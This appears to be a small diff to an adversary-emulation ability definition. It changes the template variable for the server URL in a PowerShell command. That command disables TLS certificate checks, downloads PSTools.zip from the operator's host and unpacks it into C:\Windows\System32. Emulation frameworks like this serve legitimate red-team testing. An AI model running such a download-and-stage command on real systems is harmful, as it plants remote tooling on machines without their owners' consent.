@@ -19,7 +19,7 @@ platforms:
       command: |
         [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True };
         $web = (New-Object System.Net.WebClient);
-        $result = $web.DownloadFile("#{operator.payloads}/0f64c5943add890a06b042bd9729b977afa59853/PSTools.zip", "PSTools.zip");
+        $result = $web.DownloadFile("#{operator.http}/0f64c5943add890a06b042bd9729b977afa59853/PSTools.zip", "PSTools.zip");
         New-Item -ItemType "directory" C:\Windows\System32\PSTools -Force;
         Add-Type -Assembly 'System.IO.Compression.FileSystem';
         [System.IO.Compression.ZipFile]::ExtractToDirectory("PSTools.zip", "C:\Windows\System32\PSTools");
